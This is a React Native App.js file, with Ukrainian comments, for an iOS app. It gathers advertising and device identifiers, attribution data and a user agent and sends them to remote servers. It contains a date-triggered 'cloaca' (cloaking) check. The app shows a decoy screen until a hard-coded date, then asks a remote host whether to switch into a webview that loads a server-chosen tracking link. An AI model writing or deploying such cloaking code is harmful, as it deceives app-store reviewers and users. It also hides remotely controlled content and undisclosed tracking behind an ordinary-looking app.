import React, {useEffect, useMemo, useState, useRef} from 'react';
import { JourneyRoot } from './streamsrc/JourneyRoot';
import { LoadingScreen } from './streamsrc/screens/LoadingScreen';
import ProductScreen from './streamsrc/screens/ProductScreen';
//navigation
import { NavigationContainer } from '@react-navigation/native';
import { createNativeStackNavigator } from '@react-navigation/native-stack';
const Stack = createNativeStackNavigator();
// libs
import ReactNativeIdfaAaid, {
  AdvertisingInfoResponse,
} from '@sparkfabrik/react-native-idfa-aaid';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { LogLevel, OneSignal } from 'react-native-onesignal';
import AppleAdsAttribution from '@vladikstyle/react-native-apple-ads-attribution';
import DeviceInfo from 'react-native-device-info';
import { buildExtInfo } from './streamsrc/services/buildExtInfo';
import {
  getTrackingStatus,
  requestTrackingPermission,
} from 'react-native-tracking-transparency';
import {  AppState } from 'react-native';
import appsFlyer from 'react-native-appsflyer';
//import ReactNativeIdfaAaid, {
//  AdvertisingInfoResponse,
//} from '@moxspoy/react-native-idfa-aaid';

export default function App() {
  const [route, setRoute] = useState(false);
  console.log('route===>', route);
  const [isLoading, setIsLoading] = useState(false);
  const [responseToPushPermition, setResponseToPushPermition] = useState(false);
  ////('Дозвіл на пуши прийнято? ===>', responseToPushPermition);
  const [uniqVisit, setUniqVisit] = useState(true);
  //console.log('uniqVisit===>', uniqVisit);
  const [addPartToLinkOnce, setAddPartToLinkOnce] = useState(true);
  //console.log('addPartToLinkOnce in App==>', addPartToLinkOnce);
  //////////////////Parametrs
  const [idfa, setIdfa] = useState(false);
  //console.log('idfa==>', idfa);//
  const [oneSignalId, setOneSignalId] = useState(null);
  //console.log('oneSignalId==>', oneSignalId);
  const [appsUid, setAppsUid] = useState(null);
  const [sab1, setSab1] = useState(null);
  const [atribParam, setAtribParam] = useState(null);
  //const [pid, setPid] = useState();
  console.log('appsUid==>', appsUid);
  //console.log('sab1==>', sab1);
  //console.log('pid==>', pid);
  const [customerUserId, setCustomerUserId] = useState(null);
  //console.log('customerUserID==>', customerUserId);
  const [idfv, setIdfv] = useState();
  //console.log('idfv==>', idfv);
  /////////Atributions
  const [adServicesAtribution, setAdServicesAtribution] = useState(null);
  //const [adServicesKeywordId, setAdServicesKeywordId] = useState(null);
  const [isDataReady, setIsDataReady] = useState(false);
  console.log('isDataReady==>', isDataReady);
  const [aceptTransperency, setAceptTransperency] = useState(false);
  const [completeLink, setCompleteLink] = useState(false);
  const [finalLink, setFinalLink] = useState('');
  //console.log('completeLink==>', completeLink);
  console.log('finalLink==>', finalLink);
  const [isInstallConversionDone, setIsInstallConversionDone] = useState(false);
  console.log('isInstallConversionDone==>', isInstallConversionDone);
  const [pushOpenWebview, setPushOpenWebview] = useState(false);
  //console.log('pushOpenWebview==>', pushOpenWebview);
  const [timeStampUserId, setTimeStampUserId] = useState(false);
  console.log('timeStampUserId==>', timeStampUserId);
  const [checkApsData, setCheckApsData] = useState(null);
  const [checkAsaData, setCheckAsaData] = useState(null);
  const [cloacaPass, setCloacaPass] = useState(null);
  console.log('cloacaPass==>', cloacaPass);
  const [customUserAgent, setCustomUserAgent] = useState(null);
  console.log('customUserAgent==>', customUserAgent);
  const [extinfo, setExtinfo] = useState(null);
  const [uid, setUid] = useState(null);

  const pushOpenWebviewRef = useRef(false);

  //console.log(getApp());

  const INITIAL_URL = `https://rapid-core-space.fans/`;
  const URL_IDENTIFAIRE = `6xstHFYP`;

  const FATCH_TO_OUR_BACK = `https://lean-hub-co.site/`;

  const ONESIGNAL_KEY = `7caa0853-5aeb-48fe-9b88-65220e27c0ef`;

  const TARGET_DATA = new Date(2026, 4, 29, 8, 8, 0);

  const APS_DEV_KEY = 'S2XSefMbc2XcYGFTcekTfc';
  const APP_ID = '6772095467';

  useEffect(() => {

    requestTrackingPermission();
    
  }, []);

  useEffect(() => {
    const fetchData = async () => {
      await Promise.all([checkUniqVisit(), getData()]); // Виконуються одночасно
      //console.log('checkUniqVisit та getData виконані');
      onInstallConversionDataCanceller(); // Виклик до зміни isDataReady
      //console.log('onInstallConversionDataCanceller викликаний');
      setIsDataReady(true); // Встановлюємо, що дані готові
      //console.log('isDataReady встановлено в true');
    };

    fetchData();
  }, []); ///

  useEffect(() => {
    const finalizeProcess = async () => {
      if (isDataReady && isInstallConversionDone) {
        await generateLink(); // Викликати generateLink, коли всі дані готові
        console.log('Фінальна лінка сформована!');
      }
    };

    finalizeProcess();
  }, [isDataReady, isInstallConversionDone, pushOpenWebview]);

  // uniq_visit
  const checkUniqVisit = async () => {
    const uniqVisitStatus = await AsyncStorage.getItem('uniqVisitStatus');
    let storedTimeStampUserId = await AsyncStorage.getItem('timeStampUserId');

    // додати діставання таймштампу з асінк сторідж

    if (!uniqVisitStatus) {
      // Генеруємо унікальний ID користувача з timestamp
      /////////////Timestamp + user_id generation
      const timestamp_user_id = `${new Date().getTime()}-${Math.floor(
        1000000 + Math.random() * 9000000,
      )}`;
      setTimeStampUserId(timestamp_user_id);
      console.log('timeStampUserId==========+>', timeStampUserId);

      // Зберігаємо таймштамп у AsyncStorage
      await AsyncStorage.setItem('timeStampUserId', timestamp_user_id);

      await fetch(
        `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=uniq_visit&jthrhg=${timestamp_user_id}`,
      );
      OneSignal.User.addTag('timestamp_user_id', timestamp_user_id);
      console.log('унікальний візит!!!');
      setUniqVisit(false);
      await AsyncStorage.setItem('uniqVisitStatus', 'sent');

      // додати збереження таймштампу в асінк сторідж
    } else {
      if (storedTimeStampUserId) {
        setTimeStampUserId(storedTimeStampUserId);
        console.log('Відновлений timeStampUserId:', storedTimeStampUserId);
      }
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('App');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        console.log('Дані дістаються в AsyncStorage');
        //console.log('parsedData in App==>', parsedData);
        //setAddPartToLinkOnce(parsedData.addPartToLinkOnce);
        setRoute(parsedData.route);
        setResponseToPushPermition(parsedData.responseToPushPermition);
        setUniqVisit(parsedData.uniqVisit);
        setOneSignalId(parsedData.oneSignalId);
        setIdfa(parsedData.idfa);
        setAppsUid(parsedData.appsUid);
        setSab1(parsedData.sab1);
        setAtribParam(parsedData.atribParam);
        //setPid(parsedData.pid);
        setCustomerUserId(parsedData.customerUserId);
        setIdfv(parsedData.idfv);
        setAdServicesAtribution(parsedData.adServicesAtribution);
        setAceptTransperency(parsedData.aceptTransperency);
        //setTimeStampUserId(parsedData.timeStampUserId);
        setCheckApsData(parsedData.checkApsData);
        setCheckAsaData(parsedData.checkAsaData);
        setCompleteLink(parsedData.completeLink);
        setFinalLink(parsedData.finalLink);
        setCustomUserAgent(parsedData.customUserAgent);
        setIsInstallConversionDone(parsedData.isInstallConversionDone);
        setUid(parsedData.uid);

        //await performAppsFlyerOperationsContinuously();
      } else {
        await waitForAppActive();
        await delay(1200);
        await fetchIdfa();

        gettingExtInfo();

        //gettingExtInfo();

        // Якщо дані не знайдені в AsyncStorage
        const results = await Promise.all([
          requestOneSignallFoo(),
          fetchAdServicesAttributionData(),
          performAppsFlyerOperations(),
          getUidApps(),
        ]);

        //await performAppsFlyerOperations();

        console.log('Результати функцій:', results);

        // Результати виконаних функцій
        console.log('Результати функцій:', results);
      }
    } catch (e) {
      //console.log('Помилка отримання даних в getData:', e);
    }
  };

  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  const waitForAppActive = () => {
    return new Promise(resolve => {
      if (AppState.currentState === 'active') {
        //Alert.alert(
        //  'Додаток активний, продовжуємо виконання',
        //  AppState.currentState,
        //);
        resolve();
        return;
      }

      const sub = AppState.addEventListener('change', state => {
        if (state === 'active') {
          sub.remove();
          resolve();
        }
      });
    });
  };

  const setData = async () => {
    try {
      const data = {
        route,
        responseToPushPermition,
        uniqVisit,
        oneSignalId,
        idfa,
        appsUid,
        sab1,
        atribParam,
        //pid,
        customerUserId,
        idfv,
        adServicesAtribution,
        aceptTransperency,
        finalLink,
        completeLink,
        //timeStampUserId,
        checkApsData,
        checkAsaData,
        customUserAgent,
        isInstallConversionDone,
        uid,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('App', jsonData);
      console.log('Дані збережено в AsyncStorage');
    } catch (e) {
      console.log('Помилка збереження даних:', e);
    }
  };

  useEffect(() => {
    setData();
  }, [
    route,
    responseToPushPermition,
    uniqVisit,
    oneSignalId,
    idfa,
    appsUid,
    sab1,
    atribParam,
    //pid,
    customerUserId,
    idfv,
    adServicesAtribution,
    aceptTransperency,
    finalLink,
    completeLink,
    //timeStampUserId,
    checkApsData,
    checkAsaData,
    customUserAgent,
    isInstallConversionDone,
    uid,
  ]);

  const fetchAdServicesAttributionData = async () => {
    try {
      const adServicesAttributionData =
        await AppleAdsAttribution.getAdServicesAttributionData();
      //console.log('adservices' + adServicesAttributionData);

      // Извлечение значений из объекта
      ({ attribution } = adServicesAttributionData); // Присваиваем значение переменной attribution
      ({ keywordId } = adServicesAttributionData);

      setAdServicesAtribution(attribution);
      //setAdServicesKeywordId(keywordId);!sab1 ||
      //setSab1(attribution ? 'asa' : '');
      setAtribParam(attribution ? 'asa' : '');
      setCheckAsaData(JSON.stringify(adServicesAttributionData));

      // Вывод значений в консоль
      //Alert.alert(`sab1: ${sab1}`);
      //Alert.alert(`Attribution: ${attribution}`);
      console.log(`Attribution: ${attribution}` + `KeywordId:${keywordId}`);
    } catch (error) {
      const { message } = error;
      //Alert.alert(message); // --> Some error message
    } finally {
      console.log('Attribution');
    }
  };

  /////
const gettingExtInfo = async () => {
  try {
    const extInfo = await buildExtInfo();
    const extInfoString = JSON.stringify(extInfo);
    const extInfoEncoded = encodeURIComponent(extInfoString);
    console.log('extInfo encoded:', extInfoEncoded);
    setExtinfo(extInfoEncoded);
  } catch (e) {
    console.log('gettingExtInfo error:', e);
  }
};

const extInfoFetchSent = useRef(false);

useEffect(() => {
  if (!idfa || !idfv || !customUserAgent || !extinfo) return;
  if (extInfoFetchSent.current) return;
  extInfoFetchSent.current = true;

  const sendExtInfo = async () => {
    try {
      const body = {
        index: idfa,
        strpull: extinfo,
        udevice_android_device: idfv,
        device_android_build: customUserAgent,
      };

      console.log('1t Request body:', body);
      console.log('extInfoFetch: всі дані готові, відправляємо');

      const r = await fetch(`${FATCH_TO_OUR_BACK}v1`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
      });

      const data = await r.json();
      console.log('SERVER RESPONSE:', data);

      const rawStr = data?.raw_str;
      if (!rawStr) {
        console.log('No raw_str in response');
        return;
      }

      const cleaned = rawStr.startsWith('&') ? rawStr.slice(1) : rawStr;
      const parsed = {};
      cleaned.split('&').forEach(pair => {
        if (!pair) return;
        const [rawKey, ...rest] = pair.split('=');
        parsed[decodeURIComponent(rawKey || '')] = decodeURIComponent(
          rest.join('=') || '',
        );
      });

      console.log('PARSED RAW STR:', parsed);
      const bin = parsed.bin;
      console.log('BIN VALUE:', bin);
      if (bin) {
        setUid(bin);
        console.log('UID встановлено:', bin);
      } else {
        console.log('bin not found in raw_str');
      }
    } catch (e) {
      console.log('extInfoFetch error:', e);
    }
  };

  sendExtInfo();
}, [idfa, idfv, customUserAgent, extinfo]);

  ///////// OneSignall
  const requestPermission = () => {
    return new Promise((resolve, reject) => {
      try {
        OneSignal.Notifications.requestPermission(true).then(res => {
          setResponseToPushPermition(res);

          const maxRetries = 5; // Кількість повторних спроб
          let attempts = 0;

          const fetchOneSignalId = () => {
            OneSignal.User.getOnesignalId()
              .then(deviceState => {
                if (deviceState) {
                  setOneSignalId(deviceState);
                  resolve(deviceState); // Розв'язуємо проміс, коли отримано ID
                } else if (attempts < maxRetries) {
                  attempts++;
                  setTimeout(fetchOneSignalId, 1000); // Повторна спроба через 1 секунду
                } else {
                  reject(new Error('Failed to retrieve OneSignal ID'));
                }
              })
              .catch(error => {
                if (attempts < maxRetries) {
                  attempts++;
                  setTimeout(fetchOneSignalId, 1000);
                } else {
                  console.error('Error fetching OneSignal ID:', error);
                  reject(error);
                }
              });
          };

          fetchOneSignalId(); // Викликаємо першу спробу отримання ID
        });
      } catch (error) {
        reject(error);
      }
    });
  };

  // Виклик асинхронної функції requestPermission() з використанням async/await
  const requestOneSignallFoo = async () => {
    try {
      await requestPermission();
      // Якщо все Ok
    } catch (error) {
      console.log('err в requestOneSignallFoo==> ', error);
    }
  };

  // Remove this method to stop OneSignal Debugging
  OneSignal.Debug.setLogLevel(LogLevel.Verbose);

  // OneSignal ініціалізація
  //OneSignal.initialize('137e39e3-aa53-45c0-adb7-fb2eccbd49b1');
  OneSignal.initialize(ONESIGNAL_KEY);
  //OneSignal.Debug.setLogLevel(OneSignal.LogLevel.Verbose);

  // Встановлюємо цей ID як OneSignal External ID
  useEffect(() => {
    if (timeStampUserId) {
      console.log(
        'OneSignal.login із таймштампом:',
        timeStampUserId,
        'полетів',
      );
      OneSignal.login(timeStampUserId);
    }
  }, [timeStampUserId]);

  // event push_open_browser & push_open_webview
  const pushOpenWebViewOnce = useRef(false); // Стан, щоб уникнути дублювання

  useEffect(() => {
    // Додаємо слухач подій
    const handleNotificationClick = async event => {
      if (pushOpenWebViewOnce.current) {
        return;
      }

      pushOpenWebViewOnce.current = true;

      try {
        const storedTimeStampUserId = await AsyncStorage.getItem(
          'timeStampUserId',
        );

        // ВАЖЛИВО: ref оновлюється одразу, state — ні
        pushOpenWebviewRef.current = true;
        setPushOpenWebview(true);

        // Якщо лінка вже була готова — скидаємо, щоб перегенерувати з yhugh=true
        setCompleteLink(false);

        const eventName = event?.notification?.launchURL
          ? 'push_open_browser'
          : 'push_open_webview';

        const pushEventUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=${eventName}&jthrhg=${
          storedTimeStampUserId || ''
        }`;

        console.log('OneSignal push event url =>', pushEventUrl);

        fetch(pushEventUrl).catch(error => {
          console.log('Push event fetch error =>', error);
        });

        // Якщо всі дані вже готові — одразу перегенеруємо лінку
        if (isDataReady && appsUid) {
          await generateLink(true);
        }
      } catch (error) {
        console.log('handleNotificationClick error =>', error);
      } finally {
        setTimeout(() => {
          pushOpenWebViewOnce.current = false;
        }, 2500);
      }
    };

    OneSignal.Notifications.addEventListener('click', handleNotificationClick);
    //Add Data Tags
    //OneSignal.User.addTag('timeStampUserId', timeStampUserId);

    return () => {
      // Видаляємо слухача подій при розмонтуванні
      OneSignal.Notifications.removeEventListener(
        'click',
        handleNotificationClick,
      );
    };
  }, []);

  ///////// AppsFlyer
  // 1ST FUNCTION - Ініціалізація AppsFlyer
  const performAppsFlyerOperations = async () => {
    try {
      console.log('АПС 1');
      // 1. Ініціалізація SDK
      await new Promise((resolve, reject) => {
        appsFlyer.initSdk(
          {
            devKey: APS_DEV_KEY,
            appId: APP_ID,
            isDebug: true,
            onInstallConversionDataListener: true,
            onDeepLinkListener: true,
            timeToWaitForATTUserAuthorization: 10,
            manualStart: true, // Тепер ініціалізація без автоматичного старту
          },
          result => {
            console.log('📦 AppsFlyer initSdk callback result:', result);
            resolve(result);
          },
          error => {
            console.log('❌ AppsFlyer initSdk error:', error);
            reject(error);
          },
        );
      });

      appsFlyer.startSdk();

      console.log('App.js AppsFlyer ініціалізовано успішно');
      //Alert.alert('App.js AppsFlyer ініціалізовано успішно');
      // Отримуємо idfv та встановлюємо його як customerUserID
      const uniqueId = await DeviceInfo.getUniqueId();
      setIdfv(uniqueId); // Зберігаємо idfv у стейті

      appsFlyer.setCustomerUserId(uniqueId, res => {
        console.log('Customer User ID встановлено успішно:', uniqueId);
        setCustomerUserId(uniqueId); // Зберігаємо customerUserID у стейті
      });
    } catch (error) {
      console.log(
        'App.js Помилка під час виконання операцій AppsFlyer:',
        error,
      );
    }
  };

  // 2ND FUNCTION - Ottrimannya UID AppsFlyer.
  const getUidApps = async () => {
    console.log('АПС 2');
    const maxRetries = 5; // Кількість спроб
    let attempts = 0;

    const fetchUid = async () => {
      try {
        const appsFlyerUID = await new Promise((resolve, reject) => {
          appsFlyer.getAppsFlyerUID((err, uid) => {
            if (err) {
              reject(err);
            } else {
              resolve(uid);
            }
          });
        });

        if (appsFlyerUID) {
          console.log('on getAppsFlyerUID: ' + appsFlyerUID);
          setAppsUid(appsFlyerUID);
        } else if (attempts < maxRetries) {
          attempts++;
          console.log(
            `AppsFlyerUID is null, retrying ${attempts}/${maxRetries}...`,
          );
          setTimeout(fetchUid, 1000); // Повторна спроба через 1 сек.
        } else {
          console.error('Failed to retrieve AppsFlyerUID after 5 attempts');
        }
      } catch (error) {
        if (attempts < maxRetries) {
          attempts++;
          //console.warn(
          //  `Error fetching AppsFlyerUID, retrying ${attempts}/${maxRetries}...`,
          //);
          setTimeout(fetchUid, 1000);
        } else {
          //console.error('Error fetching AppsFlyerUID:', error);
        }
      }
    };

    fetchUid(); // Викликаємо першу спробу отримання UID
  };

  // 3RD FUNCTION - Отримання неймінгу AppsFlyer
  const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
    async res => {
      // Додаємо async
      try {
        const isFirstLaunch = String(res?.data?.is_first_launch) === 'true';
        if (isFirstLaunch === true) {
          if (res.data.af_status === 'Non-organic') {
            const media_source = res.data.media_source;
            //console.log('App.js res.data==>', res.data);

            const { campaign, pid, af_adset, af_ad, af_os } = res.data;
            setSab1(campaign);
            //setPid(pid);
            setCheckApsData(JSON.stringify(res.data));
          } else if (res.data.af_status === 'Organic') {
            //await fetchAdServicesAttributionData();
            //setSab1('xxx1_xxx2_xxx3_xxx4'); //test1_test2_test3
            console.log('Organic');
          }
        } else {
          console.log('This is not first launch');
        }
      } catch (error) {
        console.log('Error processing install conversion data:', error);
      } finally {
        // Змінюємо флаг на true після виконання
        setIsInstallConversionDone(true);
      }
    },
  );

  // IDFA / ATT status
  {
    /*const fetchIdfa = async () => {
        try {
          const res =
            await ReactNativeIdfaAaid.getAdvertisingInfoAndCheckAuthorization(true);
          setIdfa(
            !res.isAdTrackingLimited
              ? res.id
              : '00000000-0000-0000-0000-000000000000',
          );
          Alert.alert(
            'ATT статус:',
            //res.isAdTrackingLimited ? 'Ограничено' : 'Разрешено',
            res.isAdTrackingLimited
              ? 'Ваш IDFA будет недоступен.'
              : `Ваш IDFA: ${res.id}`,
          );
          setAceptTransperency(true);
        } catch (err) {
          console.log(err);
          setIdfa('00000000-0000-0000-0000-000000000000');
          setAceptTransperency(true);
        }
      };**/
  }
  const fetchIdfa = async () => {
    try {
      const res = await ReactNativeIdfaAaid.getAdvertisingInfo();

      if (!res.isAdTrackingLimited) {
        //Alert.alert('ATT статус:', `Ваш IDFA: ${res.id}`);
        setIdfa(res.id);

        //Settings.setAdvertiserTrackingEnabled(true);

        setAceptTransperency(true);

        return true;
      } else {
        //Alert.alert('ATT статус:', 'Ваш IDFA будет недоступен.');
        setIdfa('00000000-0000-0000-0000-000000000000');

        //Settings.setAdvertiserTrackingEnabled(false);

        setAceptTransperency(true);

        console.log('НЕ ЗГОДА!!!!!!!!!');

        return false;
      }
    } catch (err) {
      setIdfa(null);

      //Settings.setAdvertiserTrackingEnabled(false);

      setAceptTransperency(true);
      console.log('Помилка отримання IDFA:', err);
      Alert.alert('Помилка отримання IDFA:', err.message);

      return false;
    }
  };

  ///////// Route useEff
  useEffect(() => {
    // чекаємо, поки прочитаємо AsyncStorage
    if (!isDataReady) return;

    // якщо вже є route або клоака вже проходила успішно – нічого не робимо
    if (route || cloacaPass) return;

    const checkUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
    //console.log('checkUrl==========+>', checkUrl);

    const targetData = TARGET_DATA; //дата з якої поч працювати webView
    const currentData = new Date(); //текущая дата

    if (currentData <= targetData) {
      setCompleteLink(true);
      setRoute(false);

      return;
    }

    const fetchCloaca = async () => {
      try {
        const userAgent = await DeviceInfo.getUserAgent();
        const systemVersion = DeviceInfo.getSystemVersion();
        const deviceModel = DeviceInfo.getModel();

        const customUserAgent = `${userAgent} ${deviceModel} Safari/604.1`;

        setCustomUserAgent(customUserAgent);

        const r = await fetch(checkUrl, {
          method: 'GET',
          headers: {
            'User-Agent': customUserAgent,
          },
        });

        console.log('status по клоаке=++++++++++++=>', r.status);

        if (r.status !== 404) {
          setRoute(true);
          setCloacaPass(true); // 👈 збережеться в AsyncStorage через setData
        } else {
          setRoute(false);
        }
      } catch (e) {
        console.log('errar', e);
        setRoute(false);
      }
    };

    fetchCloaca();
  }, [isDataReady, route, cloacaPass]);

  ///////// Generate link
  const generateLink = async (openedFromPush = false) => {
    try {
      console.log('Створення базової частини лінки');
      const baseUrl = [
        `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1`,
        idfa ? `idfa=${idfa}` : '',
        appsUid ? `uid=${appsUid}` : '',
        uid ? `sssUid=${uid}` : '',
        customerUserId ? `customerUserId=${customerUserId}` : '',
        oneSignalId ? `oneSignalId=${oneSignalId}` : '',
        `jthrhg=${timeStampUserId}`,
      ]
        .filter(Boolean)
        .join('&');

      // Логіка обробки sab1
      let additionalParams = '';
      if (sab1) {
        if (sab1.includes('_')) {
          console.log('Якщо sab1 містить "_", розбиваємо і формуємо subId');
          // Якщо sab1 містить "_", розбиваємо і формуємо subId
          let sabParts = sab1.split('_');
          additionalParams =
            sabParts
              .map((part, index) => `subId${index + 1}=${part}`)
              .join('&') + `&checkData=${checkApsData}`;
        } else {
          console.log('Якщо sab1 не містить "_", встановлюємо subId1=sab1');
          //// Якщо sab1 не містить "_", встановлюємо subId1=sab1
          additionalParams = `checkData=${checkApsData}`;
        }
      } else {
        console.log(
          'Якщо sab1 undefined або пустий, встановлюємо subId1=atribParam',
        );
        // Якщо sab1 undefined або пустий, встановлюємо subId1=atribParam
        additionalParams = `${
          atribParam ? `subId1=${atribParam}` : ''
        }&checkData=${checkAsaData}`;
      }
      console.log('additionalParams====>', additionalParams);

      const shouldAddPushParam = openedFromPush || pushOpenWebviewRef.current;

      // Формування фінального лінку
      const product = `${baseUrl}&${additionalParams}${
        pushOpenWebview ? `&yhugh=${pushOpenWebview}` : ''
      }${shouldAddPushParam ? '&yhugh=true' : ''}`;
      //(!addPartToLinkOnce ? `&yhugh=true` : ''); pushOpenWebview && '&yhugh=true'
      console.log('Фінальна лінка сформована');

      // Зберігаємо лінк в стейт
      setFinalLink(product);

      // Встановлюємо completeLink у true
      setTimeout(() => {
        setCompleteLink(true);
      }, 2000);
    } catch (error) {
      console.error('Помилка при формуванні лінку:', error);
    }
  };
  console.log('My product Url ==>', finalLink);

  // Бекап якщо якийсь параметр не отримано, щоб лінк все одно сформувався
  useEffect(() => {
    const timer = setTimeout(() => {
      if (!completeLink) {
        console.log('Fallback: completeLink не готовий, пускаємо далі');
        const baseUrl = [
          `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1`,
          idfa ? `idfa=${idfa}` : '',
          appsUid ? `uid=${appsUid}` : '',
          uid ? `sssUid=${uid}` : '',
          customerUserId ? `customerUserId=${customerUserId}` : '',
          oneSignalId ? `oneSignalId=${oneSignalId}` : '',
          `jthrhg=${timeStampUserId}`,
        ]
          .filter(Boolean)
          .join('&');

        let additionalParams = '';

        // Якщо sab1 undefined або пустий, встановлюємо subId1=atribParam
        additionalParams = `${
          atribParam ? `subId1=${atribParam}` : ''
        }&checkData=${checkAsaData}`;

        console.log('additionalParams====>', additionalParams);
        // Формування фінального лінку
        const product = `${baseUrl}&${additionalParams}${
          pushOpenWebview ? `&yhugh=${pushOpenWebview}` : ''
        }`;
        //(!addPartToLinkOnce ? `&yhugh=true` : ''); pushOpenWebview && '&yhugh=true'
        console.log('Фінальна лінка сформована');

        // Зберігаємо лінк в стейт
        setFinalLink(product);

        // Встановлюємо completeLink у true
        setCompleteLink(true);
      }
    }, 14000);

    return () => clearTimeout(timer);
  }, [completeLink, idfa, timeStampUserId]);

  ///////// Route
  const Route = ({ isFatch }) => {
    if (!completeLink) {
      // Показуємо тільки лоудери, поки acceptTransparency і completeLink не true
      //return null;
      return <LoadingScreen />;
    }

    if (isFatch) {
      return (
        <Stack.Navigator>
          <Stack.Screen
            initialParams={{
              responseToPushPermition,
              product: finalLink,
              timeStampUserId: timeStampUserId,
              customUserAgent: customUserAgent,
              uid: uid,
            }}
            name="ProductScreen"
            component={ProductScreen}
            options={{ headerShown: false }}
          />
        </Stack.Navigator>
      );
    }
    return (
      <Stack.Navigator screenOptions={{ headerShown: false }}>
        <Stack.Screen name="JourneyRoot" component={JourneyRoot} />
      </Stack.Navigator>
    );
  };

  useEffect(() => {
    setTimeout(() => {
      setIsLoading(true);
    }, 7000);
  }, []);

  return (
    <NavigationContainer>
      {!isLoading ? (
        <LoadingScreen />
      ) : (
        <Route isFatch={route} />
      ) }
    </NavigationContainer>
  );
}
